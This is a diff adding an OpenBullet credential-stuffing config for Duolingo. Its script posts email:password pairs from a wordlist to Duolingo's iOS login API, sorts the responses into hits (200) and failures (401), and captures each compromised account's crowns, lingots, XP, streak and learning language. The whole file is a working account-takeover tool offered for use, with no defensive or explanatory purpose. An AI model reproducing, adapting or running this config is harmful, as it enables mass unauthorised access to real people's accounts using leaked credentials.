@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "Duolingo",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-19T14:46:54.2667329+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://ios-api-2.duolingo.com/2017-06-30/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"fields\":\"_achievements,adsConfig{units},bio,coachOutfit,courses{authorId,healthEnabled,fromLanguage,id,learningLanguage,placementTestAvailable,title,xp},creationDate,currencyRewardBundles,currentCourse{authorId,checkpointTests,healthEnabled,extraCrowns,fluency,fromLanguage,id,learningLanguage,placementTestAvailable,progressQuizHistory,progressVersion,skills{accessible,bonus,conversations,explanation,finishedLessons,finishedLevels,iconId,id,indicatingNewContent,lessons,levels,name,progressRemaining,shortName,strength,urlName},sections,smartTips,status,title,trackingProperties,xp},email,enableMicrophone,enableSoundEffects,enableSpeaker,experiments,facebookId,fromLanguage,gems,gemsConfig,googleId,health,id,inviteURL,joinedClassroomIds,learningLanguage,lingots,location,motivation,name,observedClassroomIds,optionalFeatures,persistentNotifications,phoneNumber,picture,plusDiscounts,practiceReminderSettings,privacySettings,pushClubs,pushLeaderboards,requiresParentalConsent,referralInfo,roles,shopItems{id,purchaseDate,purchasePrice,subscriptionInfo{renewer},wagerDay},streakData,timezone,timezoneOffset,totalXp,trackingProperties,username,weeklyXp,xpConfig,xpGains{time, xp},zhTw\",\"identifier\":\"<USER>\",\"distinctId\":\"EE2C72B5-A05E-42F9-9C09-928DEF7C4BF2\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: DuolingoMobile/6.14.1 (iPhone; iOS 12.0.1; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: ios-api-2.duolingo.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+PARSE "<SOURCE>" LR "total_crowns\":" ",\"" -> CAP "Crowns" 
+
+PARSE "<SOURCE>" LR "learningLanguage\":\"" "\"," -> CAP "Learning Language" 
+
+PARSE "<SOURCE>" LR "\"lingots\":" ",\"" -> CAP "Lingots" 
+
+PARSE "<SOURCE>" LR "totalXp\":" ",\"" -> CAP "XP" 
+
+PARSE "<SOURCE>" LR "streak\":" ",\"" -> CAP "Streak" 
+
